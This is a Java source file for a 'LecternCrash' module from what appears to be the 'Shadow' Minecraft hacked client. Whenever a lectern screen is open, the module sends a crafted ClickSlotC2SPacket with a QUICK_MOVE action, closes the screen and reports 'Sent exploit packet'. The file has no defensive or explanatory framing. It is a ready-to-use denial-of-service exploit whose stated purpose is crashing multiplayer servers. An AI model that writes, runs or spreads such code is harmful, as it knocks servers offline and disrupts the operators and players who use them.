package net.shadow.feature.module;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.event.events.RenderListener;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.plugin.Notification;
import net.shadow.plugin.NotificationSystem;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;

public class LecternCrash extends Module {
    public LecternCrash() {
        super("Lectern", "crash the server lectern", ModuleType.CRASH);
    }

    @Override
    public String getVanityName() {
        return this.getName() + "Crash";
    }

    @Override
    public void onEnable() {
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        if(Shadow.c.currentScreen instanceof LecternScreen handler){
            MinecraftClient client = Shadow.c;
            int sid = Shadow.c.player.currentScreenHandler.syncId;
            ClickSlotC2SPacket p = new ClickSlotC2SPacket(sid, 0, 0, 0, SlotActionType.QUICK_MOVE, new ItemStack(Items.AIR), new Int2ObjectOpenHashMap<>());
            client.getNetworkHandler().sendPacket(p);
            client.player.closeHandledScreen();
            NotificationSystem.notifications.add(new Notification("LecternCrash", "Sent exploit packet", 150));
        }
    }

    @Override
    public void onRender() {
    }

}


